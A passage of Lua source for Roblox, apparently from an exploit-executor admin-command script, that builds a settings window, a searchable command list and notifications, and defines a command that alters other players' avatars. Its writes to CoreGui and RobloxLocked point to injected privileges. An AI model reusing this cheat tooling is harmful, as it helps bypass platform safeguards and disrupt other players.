Input_2 = Instance.new("TextBox")
local MTText = Instance.new("TextLabel")
local setMT = Instance.new("TextButton")
local CheckBoxS = Instance.new("ImageButton")
local slocktext = Instance.new("TextLabel")
local barBind = Instance.new("TextLabel")
local setBind = Instance.new("TextButton")
local MtimeInput = Instance.new("TextButton")
Input_3 = Instance.new("TextBox")
local size = Instance.new("Frame")
MAIN = Instance.new("Frame")
local Title_2 = Instance.new("TextLabel")
local Example = Instance.new("TextLabel")
local Search = Instance.new("TextBox")
local CMDss = Instance.new("ScrollingFrame")
local uicolortext = Instance.new("TextLabel")
local openC = Instance.new("TextButton")
cp.Name = "cp"
cp.Parent = DATA
Frame.Parent = cp
Frame.Active = true
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 1
Frame.Position = UDim2.new(1, -300, 1, -330)
Frame.Size = UDim2.new(0, 300, 0, 40)
holder.Name = "holder"
holder.Parent = Frame
holder.BackgroundColor3 = Color3.new(1, 1, 1)
holder.BackgroundTransparency = 1
holder.BorderSizePixel = 2
holder.ClipsDescendants = true
holder.Size = UDim2.new(0, 300, 0, 330)
holder.ZIndex = 2
bar.Name = "bar"
bar.Parent = holder
bar.BackgroundColor3 = maincolor
bar.BackgroundTransparency = 0.30000001192093
bar.BorderColor3 = Color3.new(0, 0, 0)
bar.BorderSizePixel = 0
bar.Position = UDim2.new(1, -295, 1, -330)
bar.Size = UDim2.new(0, 290, 0, 26)
cmds.Name = "cmds"
cmds.Parent = bar
cmds.BackgroundColor3 = Color3.new(0, 0, 0)
cmds.BackgroundTransparency = 0.80000001192093
cmds.BorderColor3 = Color3.new(1, 1, 1)
cmds.Position = UDim2.new(0, 3, 0, 3)
cmds.Size = UDim2.new(0, 70, 0, 20)
cmds.Font = Enum.Font.SourceSans
cmds.FontSize = Enum.FontSize.Size14
cmds.Text = "Commands"
cmds.TextColor3 = Color3.new(1, 1, 1)
settings.Name = "settings"
settings.Parent = bar
settings.BackgroundColor3 = Color3.new(0, 0, 0)
settings.BackgroundTransparency = 0.80000001192093
settings.BorderColor3 = Color3.new(1, 1, 1)
settings.Position = UDim2.new(0, 77, 0, 3)
settings.Size = UDim2.new(0, 70, 0, 20)
settings.Font = Enum.Font.SourceSans
settings.FontSize = Enum.FontSize.Size14
settings.Text = "Settings"
settings.TextColor3 = Color3.new(1, 1, 1)
Hide.Name = "Hide"
Hide.Parent = bar
Hide.BackgroundColor3 = Color3.new(1, 1, 1)
Hide.BackgroundTransparency = 0.30000001192093
Hide.BorderColor3 = Color3.new(1, 1, 1)
Hide.BorderSizePixel = 0
Hide.Position = UDim2.new(0, 243, 0, 3)
Hide.Size = UDim2.new(0, 20, 0, 20)
Hide.FontSize = Enum.FontSize.Size14
Hide.Text = ""
Exit.Name = "Exit"
Exit.Parent = bar
Exit.BackgroundColor3 = Color3.new(1, 0, 0)
Exit.BackgroundTransparency = 0.30000001192093
Exit.BorderColor3 = Color3.new(1, 0, 0)
Exit.BorderSizePixel = 0
Exit.Position = UDim2.new(0, 267, 0, 3)
Exit.Size = UDim2.new(0, 20, 0, 20)
Exit.FontSize = Enum.FontSize.Size14
Exit.Text = ""
FeedbackMain.Name = "FeedbackMain"
FeedbackMain.Parent = holder
FeedbackMain.BackgroundColor3 = maincolor
FeedbackMain.BackgroundTransparency = 0.5
FeedbackMain.BorderColor3 = Color3.new(0, 0, 0)
FeedbackMain.BorderSizePixel = 0
FeedbackMain.Position = UDim2.new(1.01999998, -301, 1.01800001, -310)
FeedbackMain.Size = UDim2.new(0, 290, 0, 300)
Title.Name = "Title"
Title.Parent = FeedbackMain
Title.BackgroundColor3 = Color3.new(1, 1, 1)
Title.BackgroundTransparency = 1
Title.Size = UDim2.new(1, 0, 0, 30)
Title.Font = Enum.Font.SourceSansBold
Title.FontSize = Enum.FontSize.Size24
Title.Text = "Settings"
Title.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
Title.TextStrokeTransparency = 0
checkboxText.Name = "checkboxText"
checkboxText.Parent = FeedbackMain
checkboxText.BackgroundColor3 = Color3.new(1, 1, 1)
checkboxText.BackgroundTransparency = 1
checkboxText.Position = UDim2.new(0, 0, 0, 60)
checkboxText.Size = UDim2.new(1, 0, 0, 30)
checkboxText.Font = Enum.Font.SourceSansBold
checkboxText.FontSize = Enum.FontSize.Size18
checkboxText.Text = "     Suggestions"
checkboxText.TextColor3 = Color3.new(0.976471, 0.976471, 0.976471)
checkboxText.TextStrokeTransparency = 0
checkboxText.TextXAlignment = Enum.TextXAlignment.Left
CheckBox.Name = "CheckBox"
CheckBox.Parent = FeedbackMain
CheckBox.BackgroundTransparency = 1
CheckBox.Position = UDim2.new(0, 240, 0, 60)
CheckBox.Size = UDim2.new(0, 30, 0, 30)
CheckBox.Image = "http://www.roblox.com/asset/?id=65492641"
bindInput.Name = "bindInput"
bindInput.Parent = FeedbackMain
bindInput.BackgroundColor3 = Color3.new(1, 1, 1)
bindInput.Position = UDim2.new(0, 187, 0, 260)
bindInput.Size = UDim2.new(0, 30, 0, 30)
bindInput.AutoButtonColor = false
bindInput.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
bindInput.Font = Enum.Font.SourceSans
bindInput.FontSize = Enum.FontSize.Size14
bindInput.Text = ""
Input.Name = "Input"
Input.Parent = bindInput
Input.BackgroundColor3 = Color3.new(1, 1, 1)
Input.BackgroundTransparency = 1
Input.Position = UDim2.new(0, -8, 0, -8)
Input.Size = UDim2.new(0, 20, 0, 20)
Input.Font = Enum.Font.SourceSansBold
Input.FontSize = Enum.FontSize.Size18
Input.MultiLine = true
Input.Text = ";"
Input.TextColor3 = Color3.new(0.235294, 0.235294, 0.235294)
Input.TextWrapped = true
Input.TextYAlignment = Enum.TextYAlignment.Top
preText.Name = "preText"
preText.Parent = FeedbackMain
preText.BackgroundColor3 = Color3.new(1, 1, 1)
preText.BackgroundTransparency = 1
preText.Position = UDim2.new(0, 0, 0, 140)
preText.Size = UDim2.new(1, 0, 0, 30)
preText.Font = Enum.Font.SourceSansBold
preText.FontSize = Enum.FontSize.Size18
preText.Text = "     Prefix"
preText.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
preText.TextStrokeTransparency = 0
preText.TextXAlignment = Enum.TextXAlignment.Left
setpre.Name = "setpre"
setpre.Parent = FeedbackMain
setpre.BackgroundColor3 = Color3.new(1, 1, 1)
setpre.BorderSizePixel = 5
setpre.Position = UDim2.new(0, 235, 0, 142)
setpre.Size = UDim2.new(0, 40, 0, 25)
setpre.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
setpre.Font = Enum.Font.ArialBold
setpre.FontSize = Enum.FontSize.Size18
setpre.Text = "Set"
everyone.Name = "everyone"
everyone.Parent = FeedbackMain
everyone.BackgroundColor3 = Color3.new(0, 0, 0)
everyone.BackgroundTransparency = 0.80000001192093
everyone.BorderColor3 = Color3.new(0, 0, 0)
everyone.Position = UDim2.new(0, 230, 0, 237)
everyone.Size = UDim2.new(0, 50, 0, 20)
everyone.Font = Enum.Font.SourceSans
everyone.FontSize = Enum.FontSize.Size14
everyone.Text = "Everyone"
everyone.TextColor3 = Color3.new(1, 1, 1)
JLtext.Name = "JLtext"
JLtext.Parent = FeedbackMain
JLtext.BackgroundColor3 = Color3.new(1, 1, 1)
JLtext.BackgroundTransparency = 1
JLtext.Position = UDim2.new(0, 0, 0, 220)
JLtext.Size = UDim2.new(1, 0, 0, 30)
JLtext.Font = Enum.Font.SourceSansBold
JLtext.FontSize = Enum.FontSize.Size18
JLtext.Text = "     Joined/Left Notifications"
JLtext.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
JLtext.TextStrokeTransparency = 0
JLtext.TextXAlignment = Enum.TextXAlignment.Left
CheckBoxJL.Name = "CheckBoxJL"
CheckBoxJL.Parent = FeedbackMain
CheckBoxJL.BackgroundTransparency = 1
CheckBoxJL.Position = UDim2.new(0, 187, 0, 220)
CheckBoxJL.Size = UDim2.new(0, 30, 0, 30)
CheckBoxJL.Image = "http://www.roblox.com/asset/?id=65492641"
friends.Name = "friends"
friends.Parent = FeedbackMain
friends.BackgroundColor3 = Color3.new(0, 0, 0)
friends.BackgroundTransparency = 0.80000001192093
friends.BorderColor3 = Color3.new(1, 1, 1)
friends.Position = UDim2.new(0, 230, 0, 215)
friends.Size = UDim2.new(0, 50, 0, 20)
friends.Font = Enum.Font.SourceSans
friends.FontSize = Enum.FontSize.Size14
friends.Text = "Friends"
friends.TextColor3 = Color3.new(1, 1, 1)
InputBox.Name = "InputBox"
InputBox.Parent = FeedbackMain
InputBox.BackgroundColor3 = Color3.new(1, 1, 1)
InputBox.Position = UDim2.new(0, 187, 0, 140)
InputBox.Size = UDim2.new(0, 30, 0, 30)
InputBox.AutoButtonColor = false
InputBox.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
InputBox.Font = Enum.Font.SourceSans
InputBox.FontSize = Enum.FontSize.Size14
InputBox.Text = ""
Input_2.Name = "Input"
Input_2.Parent = InputBox
Input_2.BackgroundColor3 = Color3.new(1, 1, 1)
Input_2.BackgroundTransparency = 1
Input_2.Position = UDim2.new(0, -8, 0, -8)
Input_2.Size = UDim2.new(0, 20, 0, 20)
Input_2.Font = Enum.Font.SourceSansBold
Input_2.FontSize = Enum.FontSize.Size18
Input_2.MultiLine = true
Input_2.Text = ";"
Input_2.TextColor3 = Color3.new(0.235294, 0.235294, 0.235294)
Input_2.TextWrapped = true
Input_2.TextYAlignment = Enum.TextYAlignment.Top
MTText.Name = "MTText"
MTText.Parent = FeedbackMain
MTText.BackgroundColor3 = Color3.new(1, 1, 1)
MTText.BackgroundTransparency = 1
MTText.Position = UDim2.new(0, 0, 0, 180)
MTText.Size = UDim2.new(1, 0, 0, 30)
MTText.Font = Enum.Font.SourceSansBold
MTText.FontSize = Enum.FontSize.Size18
MTText.Text = "     Message Seconds"
MTText.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
MTText.TextStrokeTransparency = 0
MTText.TextXAlignment = Enum.TextXAlignment.Left
setMT.Name = "setMT"
setMT.Parent = FeedbackMain
setMT.BackgroundColor3 = Color3.new(1, 1, 1)
setMT.BorderSizePixel = 5
setMT.Position = UDim2.new(0, 235, 0, 183)
setMT.Size = UDim2.new(0, 40, 0, 25)
setMT.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
setMT.Font = Enum.Font.ArialBold
setMT.FontSize = Enum.FontSize.Size18
setMT.Text = "Set"
CheckBoxS.Name = "CheckBoxS"
CheckBoxS.Parent = FeedbackMain
CheckBoxS.BackgroundTransparency = 1
CheckBoxS.Position = UDim2.new(0, 240, 0, 100)
CheckBoxS.Size = UDim2.new(0, 30, 0, 30)
CheckBoxS.Image = "http://www.roblox.com/asset/?id=65492641"
slocktext.Name = "slocktext"
slocktext.Parent = FeedbackMain
slocktext.BackgroundColor3 = Color3.new(1, 1, 1)
slocktext.BackgroundTransparency = 1
slocktext.Position = UDim2.new(0, 0, 0, 100)
slocktext.Size = UDim2.new(1, 0, 0, 30)
slocktext.Font = Enum.Font.SourceSansBold
slocktext.FontSize = Enum.FontSize.Size18
slocktext.Text = "     Allow Friends On Serverlock"
slocktext.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
slocktext.TextStrokeTransparency = 0
slocktext.TextXAlignment = Enum.TextXAlignment.Left
barBind.Name = "barBind"
barBind.Parent = FeedbackMain
barBind.BackgroundColor3 = Color3.new(1, 1, 1)
barBind.BackgroundTransparency = 1
barBind.Position = UDim2.new(0, 0, 0, 260)
barBind.Size = UDim2.new(1, 0, 0, 30)
barBind.Font = Enum.Font.SourceSansBold
barBind.FontSize = Enum.FontSize.Size18
barBind.Text = "     Command Bar Keybind"
barBind.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
barBind.TextStrokeTransparency = 0
barBind.TextXAlignment = Enum.TextXAlignment.Left
setBind.Name = "setBind"
setBind.Parent = FeedbackMain
setBind.BackgroundColor3 = Color3.new(1, 1, 1)
setBind.BorderSizePixel = 5
setBind.Position = UDim2.new(0, 235, 0, 262)
setBind.Size = UDim2.new(0, 40, 0, 25)
setBind.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
setBind.Font = Enum.Font.ArialBold
setBind.FontSize = Enum.FontSize.Size18
setBind.Text = "Set"
MtimeInput.Name = "MtimeInput"
MtimeInput.Parent = FeedbackMain
MtimeInput.BackgroundColor3 = Color3.new(1, 1, 1)
MtimeInput.Position = UDim2.new(0, 187, 0, 180)
MtimeInput.Size = UDim2.new(0, 30, 0, 30)
MtimeInput.AutoButtonColor = false
MtimeInput.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
MtimeInput.Font = Enum.Font.SourceSans
MtimeInput.FontSize = Enum.FontSize.Size14
MtimeInput.Text = ""
Input_3.Name = "Input"
Input_3.Parent = MtimeInput
Input_3.BackgroundColor3 = Color3.new(1, 1, 1)
Input_3.BackgroundTransparency = 1
Input_3.Position = UDim2.new(0, -8, 0, -8)
Input_3.Size = UDim2.new(0, 20, 0, 20)
Input_3.Font = Enum.Font.SourceSansBold
Input_3.FontSize = Enum.FontSize.Size18
Input_3.MultiLine = true
Input_3.Text = "7"
Input_3.TextColor3 = Color3.new(0.235294, 0.235294, 0.235294)
Input_3.TextWrapped = true
Input_3.TextYAlignment = Enum.TextYAlignment.Top
uicolortext.Name = "uicolortext"
uicolortext.Parent = FeedbackMain
uicolortext.BackgroundColor3 = Color3.new(1, 1, 1)
uicolortext.BackgroundTransparency = 1
uicolortext.Position = UDim2.new(0, 0, 0, 30)
uicolortext.Size = UDim2.new(1, 0, 0, 30)
uicolortext.Font = Enum.Font.SourceSansBold
uicolortext.FontSize = Enum.FontSize.Size18
uicolortext.Text = "     UI Color"
uicolortext.TextColor3 = Color3.new(0.976471, 0.976471, 0.976471)
uicolortext.TextStrokeTransparency = 0
uicolortext.TextXAlignment = Enum.TextXAlignment.Left
openC.Name = "openC"
openC.Parent = FeedbackMain
openC.BackgroundColor3 = Color3.new(1, 1, 1)
openC.BorderSizePixel = 5
openC.Position = UDim2.new(0, 235, 0, 32)
openC.Size = UDim2.new(0, 40, 0, 25)
openC.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
openC.Font = Enum.Font.ArialBold
openC.FontSize = Enum.FontSize.Size18
openC.Text = "Set"
size.Name = "size"
size.Parent = holder
size.BackgroundColor3 = Color3.new(0.639216, 0.635294, 0.647059)
size.BackgroundTransparency = 1
size.Position = UDim2.new(1, -301, 1, -300)
size.Size = UDim2.new(0, 275, 0, 300)
size.ZIndex = 2
MAIN.Name = "MAIN"
MAIN.Parent = size
MAIN.BackgroundColor3 = maincolor
MAIN.BackgroundTransparency = 0.5
MAIN.BorderColor3 = Color3.new(0, 0, 0)
MAIN.BorderSizePixel = 0
MAIN.Position = UDim2.new(0.0181818176, 1, 1.00333333, -305)
MAIN.Size = UDim2.new(0, 290, 0, 300)
Title_2.Name = "Title"
Title_2.Parent = MAIN
Title_2.BackgroundColor3 = Color3.new(0.639216, 0.635294, 0.647059)
Title_2.BackgroundTransparency = 1
Title_2.Size = UDim2.new(1, 0, 0, 30)
Title_2.Font = Enum.Font.SourceSansBold
Title_2.FontSize = Enum.FontSize.Size24
Title_2.Text = "Commands"
Title_2.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)
Title_2.TextStrokeTransparency = 0
Example.Name = "Example"
Example.Parent = MAIN
Example.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Example.BackgroundTransparency = 1
Example.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
Example.BorderSizePixel = 0
Example.Size = UDim2.new(0, 190, 0, 20)
Example.Visible = false
Example.Font = Enum.Font.SourceSansBold
Example.TextSize = 20
Example.Text = "txt"
Example.TextColor3 = Color3.new(0.972549, 0.972549, 0.972549)
Example.TextStrokeTransparency = 0
Example.TextXAlignment = Enum.TextXAlignment.Left
Example.ZIndex = 6
Search.Name = "Search"
Search.Parent = MAIN
Search.BackgroundColor3 = Color3.new(0, 0, 0)
Search.BackgroundTransparency = 0.69999998807907
Search.BorderColor3 = Color3.new(1, 1, 1)
Search.Position = UDim2.new(0.5, -127, 0.200000003, -25)
Search.Size = UDim2.new(0, 250, 0, 20)
Search.ClearTextOnFocus = false
Search.Font = Enum.Font.SourceSansBold
Search.FontSize = Enum.FontSize.Size18
Search.Text = "Search"
Search.TextColor3 = Color3.new(1, 1, 1)
Search.TextStrokeColor3 = Color3.new(0.258824, 0.258824, 0.258824)
Search.TextStrokeTransparency = 0
CMDss.Name = "CMDs"
CMDss.Parent = MAIN
CMDss.BackgroundColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
CMDss.BackgroundTransparency = 1
CMDss.BorderColor3 = Color3.new(0.0666667, 0.0666667, 0.0666667)
CMDss.BorderSizePixel = 0
CMDss.Position = UDim2.new(0, 10, 0, 65)
CMDss.Size = UDim2.new(0, 280, 0, 230)
CMDss.BottomImage = "rbxasset://textures/blackBkg_square.png"
CMDss.CanvasSize = UDim2.new(0, 0, 0, 5260)
CMDss.MidImage = "rbxasset://textures/blackBkg_square.png"
CMDss.ScrollBarThickness = 8
CMDss.TopImage = "rbxasset://textures/blackBkg_square.png"
notifyMAIN = Instance.new('ScreenGui', DATA)
notifyMAIN.Name = 'Notification'
notifyNOT = Instance.new('Frame', notifyMAIN)
notifyNOT.Name = 'NOTIFY'
notifyNOT.BackgroundColor = BrickColor.new(0,0,0)
notifyNOT.BackgroundTransparency = 1
notifyNOT.BorderColor = BrickColor.new(0,0,0)
notifyNOT.BorderSizePixel = 2
notifyNOT.Position = UDim2.new(0,0,-0.06,0)
notifyNOT.Size = UDim2.new(1,0,0,-40)
notifyNOTE = Instance.new('TextLabel', notifyNOT)
notifyNOTE.Name = 'NOTE'
notifyNOTE.BackgroundColor = BrickColor.new(255,255,255)
notifyNOTE.BackgroundTransparency = 1
notifyNOTE.BorderColor = BrickColor.new(255,255,255)
notifyNOTE.BorderSizePixel = 0
notifyNOTE.Size = UDim2.new(1,0,1,0)
notifyNOTE.ZIndex = 4
notifyNOTE.FontSize = 'Size18'
notifyNOTE.Font = 'SourceSansBold'
notifyNOTE.Text = 'NOTIFY'
notifyNOTE.TextColor = BrickColor.new(255,255,255)
notifyNOTE.TextStrokeColor3 = Color3.new(0,0,0)
notifyNOTE.TextStrokeTransparency = 0.8

addcmd('ayylmao','ayy lmao',{'alien'},
function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players)do
	    local pchar = gPlayers[v].Character
	    if pchar:FindFirstChild("Shirt") then
		    pchar.Shirt:Destroy()
	    end
	    if pchar:FindFirstChild("Pants") then
		    pchar.Pants:Destroy()
	    end
	    if pchar:FindFirstChild("Shirt Graphic") then
		    pchar["Shirt Graphic"].Graphic = ""
	    end
	    for i,v in pairs(pchar:GetChildren()) do
		    if v:IsA("Accessory") then
			    v:Destroy()
		    end
	    end
	    local ayylmao = DATA.ayylmao:Clone()
	    ayylmao.Parent = pchar
	    local BC = pchar["Body Colors"]
	    BC.HeadColor = BrickColor.new("Fossil")
	    BC.LeftArmColor = BrickColor.new("Fossil")
	    BC.LeftLegColor = BrickColor.new("Fossil")
	    BC.RightArmColor = BrickColor.new("Fossil")
	    BC.RightLegColor = BrickColor.new("Fossil")
	    BC.TorsoColor = BrickColor.new("Fossil")
	end
end)
HKFolder = Instance.new("Folder", game.CoreGui)
for i,v in pairs(HK) do
	local HKValue = Instance.new("StringValue", HKFolder)
	HKValue.Value = v
	HKValue.RobloxLocked = true
end
CMDsFolder = Instance.new("Folder", game.CoreGui)
for i,v in pairs(CMDs) do
	local CMDsValue = Instance.new("StringValue", CMDsFolder)
	CMDsValue.Value = v
	CMDsValue.RobloxLocked = true
end
cmdOpen = false
function commands()
	if cmdOpen == false then
	cmdOpen = true
	local cmds = cp:Clone()
	cmds.Parent = game.CoreGui
	local HKV = HKFolder:GetChildren()
	local CMDsV = CMDsFolder:GetChildren()
	dragGUI(cmds.Frame)
	cmds.Frame.holder:TweenSize(UDim2.new(0,300,0,0),"Out","Quad",0.01,true) wait(0.01)
cmds.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,0,1.018,-310),"Out","Quad",0.2,true) wait(0.1)
cmds.Frame.holder.size:TweenPosition(UDim2.new(1,-301,1,-300),"Out","Quad",0.2,true)
SettingsGUI = game.CoreGui.cp.Frame.holder if Nfriends == true then
SettingsGUI.FeedbackMain.friends.BorderColor3 = Color3.new(1,1,1)
SettingsGUI.FeedbackMain.everyone.BorderColor3 = Color3.new(0,0,0) elseif Nfriends == false then
SettingsGUI.FeedbackMain.friends.BorderColor3 = Color3.new(0,0,0)
SettingsGUI.FeedbackMain.everyone.BorderColor3 = Color3.new(1,1,1)
end
--joined/left friend option
SettingsGUI.FeedbackMain.friends.MouseButton1Click:connect(function()
SettingsGUI.FeedbackMain.friends.BorderColor3 = Color3.new(1,1,1)
SettingsGUI.FeedbackMain.everyone.BorderColor3 = Color3.new(0,0,0)
Nfriends = true updatefile()
end)
SettingsGUI.FeedbackMain.everyone.MouseButton1Click:connect(function()
SettingsGUI.FeedbackMain.friends.BorderColor3 = Color3.new(0,0,0)
SettingsGUI.FeedbackMain.everyone.BorderColor3 = Color3.new(1,1,1)
Nfriends = false updatefile()
end)
-- Color mixer
SettingsGUI.FeedbackMain.openC.MouseButton1Click:Connect(function()
picker.ColorPicker.Visible = true picker.ColorPicker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)
end)
--Message time
SettingsGUI.FeedbackMain.setMT.MouseButton1Click:Connect(function()
wait()
	Mseconds = SettingsGUI.FeedbackMain.MtimeInput.Input.Text
	Notify('Set message time to ' ..SettingsGUI.FeedbackMain.MtimeInput.Input.Text.. ' second(s)')
	updatefile()
end)
--CMDBAR keybind
SettingsGUI.FeedbackMain.setBind.MouseButton1Click:Connect(function()
wait()
	cmdbarbind = SettingsGUI.FeedbackMain.bindInput.Input.Text
	cmdBAR.Text = 'Press ' ..cmdbarbind.. ' to focus the cmd bar'
	Notify('Set the command bar keybind to "' ..SettingsGUI.FeedbackMain.bindInput.Input.Text .. '"' )
	updatefile()
end)
--Change prefix
SettingsGUI.FeedbackMain.setpre.MouseButton1Click:Connect(function()
wait()
	cmdprefix = SettingsGUI.FeedbackMain.InputBox.Input.Text
	Notify('Set prefix to "' .. SettingsGUI.FeedbackMain.InputBox.Input.Text .. '"')
	updatefile()
end)
--Check Box for notify
checked = "http://www.roblox.com/asset/?id=65492641"
unchecked = "http://www.roblox.com/asset/?id=65492651"
if suggestionstoggle == true then
SettingsGUI.FeedbackMain.CheckBox.Image = checked else
SettingsGUI.FeedbackMain.CheckBox.Image = unchecked end
SettingsGUI.FeedbackMain.CheckBox.MouseButton1Down:connect(function()
if suggestionstoggle == true then suggestionstoggle = false updatefile()
SettingsGUI.FeedbackMain.CheckBox.Image = unchecked else
suggestionstoggle = true
updatefile()
SettingsGUI.FeedbackMain.CheckBox.Image = checked end end)
--Check Box for allow friends on serverlock
checked2 = "http://www.roblox.com/asset/?id=65492641"
unchecked2 = "http://www.roblox.com/asset/?id=65492651"
if allowfriends == true then
SettingsGUI.FeedbackMain.CheckBoxS.Image = checked2 else
SettingsGUI.FeedbackMain.CheckBoxS.Image = unchecked2 end
SettingsGUI.FeedbackMain.CheckBoxS.MouseButton1Down:connect(function()
if allowfriends == true then allowfriends = false updatefile()
SettingsGUI.FeedbackMain.CheckBoxS.Image = unchecked2 else
allowfriends = true updatefile()
SettingsGUI.FeedbackMain.CheckBoxS.Image = checked2 end end)
--Check Box for JoinedLeft notifications
checked3 = "http://www.roblox.com/asset/?id=65492641"
unchecked3 = "http://www.roblox.com/asset/?id=65492651"
if JLnotify == true then
SettingsGUI.FeedbackMain.CheckBoxJL.Image = checked3 else
SettingsGUI.FeedbackMain.CheckBoxJL.Image = unchecked3 end
SettingsGUI.FeedbackMain.CheckBoxJL.MouseButton1Down:connect(function()
if JLnotify == true then JLnotify = false updatefile()
SettingsGUI.FeedbackMain.CheckBoxJL.Image = unchecked3 else JLnotify = true
SettingsGUI.FeedbackMain.CheckBoxJL.Image = checked3 updatefile()
SettingsGUI.FeedbackMain.friends.BorderColor3 = Color3.new(1,1,1)
SettingsGUI.FeedbackMain.everyone.BorderColor3 = Color3.new(0,0,0) end end)
cmds.Frame.holder.bar.cmds.MouseButton1Click:Connect(function()
cmds.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,0,1.018,-310),"Out","Quad",0.2,true) wait(0.1)
cmds.Frame.holder.size:TweenPosition(UDim2.new(1,-301,1,-300),"Out","Quad",0.2,true) wait(0.2)
cmds.Frame.holder.bar.Hide.Visible = true
cmds.Frame.holder.bar.Hide:TweenSize(UDim2.new(0,20,0,20),"Out","Quad",0.2,true) end)
cmds.Frame.holder.bar.settings.MouseButton1Click:Connect(function()
cmds.Frame.holder.size:TweenPosition(UDim2.new(1,-600,1,-300),"Out","Quad",0.2,true) wait(0.1)
cmds.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,-301,1.018,-310),"Out","Quad",0.2,true) wait(0.2)
cmds.Frame.holder.bar.Hide.Visible = true
cmds.Frame.holder.bar.Hide:TweenSize(UDim2.new(0,20,0,20),"Out","Quad",0.2,true) end)
cmds.Frame.holder.bar.Hide.MouseButton1Click:Connect(function()
cmds.Frame.holder.size:TweenPosition(UDim2.new(1,-301,1,-640),"Out","Quad",0.2,true)
cmds.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,-301,0.018,-310),"Out","Quad",0.2,true) wait(0.2)
cmds.Frame.holder.bar.Hide:TweenSize(UDim2.new(0,20,0,0),"Out","Quad",0.2,true) wait(0.2)
cmds.Frame.holder.bar.Hide.Visible = false end)
cmds.Frame.holder.bar.Exit.MouseButton1Click:Connect(function()
Input.Text = cmdbarbind Input_2.Text = cmdprefix Input_3.Text = Mseconds
cmds.Frame.holder:TweenSize(UDim2.new(0,300,0,0),"Out","Quad",0.2,true) wait(0.3)
cmds:Destroy() cmdOpen = false end)
cmds.Frame.holder:TweenSize(UDim2.new(0,300,0,330),"Out","Quad",0.2,true)
searchbar()
	for i = 1, #HKV do
		local YSize = 25
		local Position = ((i * YSize) - YSize)
		local newcmd = cmds.Frame.holder.size.MAIN.Example:Clone()
		newcmd.Parent = cmds.Frame.holder.size.MAIN.CMDs
		newcmd.Visible = true
		newcmd.Position = UDim2.new(0,5,0, Position + 5)
		newcmd.Text = "" .. HKV[i].Value
		CMDss.CanvasSize = UDim2.new(0,0,0, Position + 30)
		Input.Text = cmdbarbind Input_2.Text = cmdprefix Input_3.Text = Mseconds
	end
	for i = 1, #CMDsV do
		local YSize = 25
		local Position = ((i * YSize) - YSize)
		local newcmd = cmds.Frame.holder.size.MAIN.Example:Clone()
		newcmd.Parent = cmds.Frame.holder.size.MAIN.CMDs
		newcmd.Visible = true
		newcmd.Position = UDim2.new(0,5,0, Position + 5)
		newcmd.Text = "" .. CMDsV[i].Value
		CMDss.CanvasSize = UDim2.new(0,0,0, Position + 30)
		Input.Text = cmdbarbind Input_2.Text = cmdprefix Input_3.Text = Mseconds
	end
game.CoreGui.cp.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,0,1.018,-310),"Out","Quad",0.2,true) wait(0.1)
game.CoreGui.cp.Frame.holder.size:TweenPosition(UDim2.new(1,-301,1,-300),"Out","Quad",0.2,true) wait(0.2)
game.CoreGui.cp.Frame.holder.bar.Hide.Visible = true
game.CoreGui.cp.Frame.holder.bar.Hide:TweenSize(UDim2.new(0,20,0,20),"Out","Quad",0.2,true) end end

function searchbar()
local CSP = game.CoreGui.cp.Frame.holder.size.MAIN
local main = CSP
local frame = CSP:WaitForChild('CMDs')
local gui = CSP:WaitForChild('Search')
local focused = false
Match = function(name,str)
	return name:lower():find(str:lower()) and true
end
gui.FocusLost:connect(function(enterpressed)
gui.Text = "Search"
end)
IndexContents = function(str,bool)
	local Index,SizeY = 0,0
	for i,v in next, frame:GetChildren() do
		if bool then
			if Match(v.Text,str) then
				Index = Index + 1
				v.Position = UDim2.new(0,0,0,Index*v.AbsoluteSize.Y-v.AbsoluteSize.Y)
				v.Visible = true
				SizeY = SizeY + v.AbsoluteSize.Y
				frame.CanvasSize = UDim2.new(0,0,0,SizeY)
			else
				v.Visible = false
			end
		else
			v.Visible = true
			SizeY = SizeY + v.AbsoluteSize.Y
			frame.CanvasSize = UDim2.new(0,0,0,SizeY)
		end
	end
end
game:GetService('RunService').Stepped:connect(function()
	if gui:IsFocused() and gui.Text == "Search" then
	gui.Text = ''
	end
end)
gui.Changed:connect(function()
	if gui:IsFocused() then IndexContents(gui.Text,true) end
end)

IndexContents('',true)
end

function runwindow()
commands()
searchbar()
end

addcmd('settings','opens settings window',{'toggles'},
function(args, speaker)
if speaker.userId ~= LP.userId then
lponly(speaker)
else
runwindow()
game.CoreGui.cp.Frame.holder.size:TweenPosition(UDim2.new(1,-600,1,-300),"Out","Quad",0.2,true)
wait(0.1)
game.CoreGui.cp.Frame.holder.FeedbackMain:TweenPosition(UDim2.new(1.02,-301,1.018,-310),"Out","Quad",0.2,true)
wait(0.1)
game.CoreGui.cp.Frame.holder.bar.Hide.Visible = true
game.CoreGui.cp.Frame.holder.bar.Hide:TweenSize(UDim2.new(0,20,0,20),"Out","Quad",0.2,true)
end
end)

function movetab(speaker,PART)
game:GetService('RunService').Stepped:connect(function()
if PART ~= nil and speaker ~= nil and speaker.Character:FindFirstChild('HumanoidRootPart') then
PART.Locked = true
local cf = speaker.Character.HumanoidRootPart.CFrame
local newcf = cf + cf.lookVector * 6 + Vector3.new(0, 1, 0)
